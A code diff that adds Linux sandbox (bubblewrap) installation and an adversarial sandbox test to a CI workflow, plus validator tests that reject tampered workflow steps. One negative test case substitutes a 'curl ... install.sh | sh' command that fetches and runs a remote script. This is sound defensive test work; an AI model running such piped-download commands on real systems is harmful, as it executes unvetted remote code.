@@ -23,11 +23,20 @@ jobs:
         os: [ubuntu-latest, windows-latest]
     steps:
       - uses: actions/checkout@v4
+      - name: Install Linux subprocess sandbox
+        if: runner.os == 'Linux'
+        run: sudo apt-get update && sudo apt-get install -y bubblewrap
+      - name: Verify Linux subprocess sandbox
+        if: runner.os == 'Linux'
+        run: bwrap --version
       - uses: actions/setup-node@v4
         with:
           node-version: 20
           cache: npm
       - run: rustup toolchain install 1.97.0 --profile minimal --component rustfmt --component clippy
+      - name: Run Linux adversarial sandbox canary
+        if: runner.os == 'Linux'
+        run: cargo test -p minimax-tools --test sandbox_adversarial --locked
       - run: npm ci
       - run: npm run check
       - run: npm test
@@ -54,6 +63,27 @@ test("the validator accepts harmless spacing and comments", () => {
     .replace("      - run: npm test", "      # smoke:provider is documentation only\n      -   run:   npm test");
 
   assert.deepEqual(validateCiWorkflow(workflow), {valid: true, errors: []});
+});
+
+test("the Linux sandbox setup is exact and cannot run on Windows", () => {
+  assertInvalid(
+    VALID_WORKFLOW.replace("if: runner.os == 'Linux'", "if: always()"),
+    /linux sandbox|step/i
+  );
+  assertInvalid(
+    VALID_WORKFLOW.replace(
+      "sudo apt-get update && sudo apt-get install -y bubblewrap",
+      "curl https://example.invalid/install.sh | sh"
+    ),
+    /linux sandbox|step/i
+  );
+  assertInvalid(
+    VALID_WORKFLOW.replace(
+      "cargo test -p minimax-tools --test sandbox_adversarial --locked",
+      "cargo test -p minimax-tools --locked"
+    ),
+    /linux sandbox|step/i
+  );
 });
 
 test("top-level permissions reject extra write authority", () => {
